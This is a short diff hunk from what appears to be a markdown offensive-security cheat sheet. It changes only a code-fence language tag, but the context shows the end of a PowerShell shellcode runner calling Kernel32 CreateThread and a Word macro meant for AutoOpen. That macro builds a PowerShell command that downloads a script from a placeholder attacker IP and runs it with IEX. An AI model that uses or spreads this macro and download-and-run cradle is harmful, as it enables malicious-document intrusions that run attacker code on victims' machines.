@@ -78,7 +78,7 @@ $thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
 ```
 
 Add this to a Microsoft Word Macro AutoOpen():
-```vba
+```vb
 Sub MyMacro()
   Dim str As String
   str = "powershell (New-Object System.Net.WebClient).DownloadString('http://IP/run.ps1') | IEX"
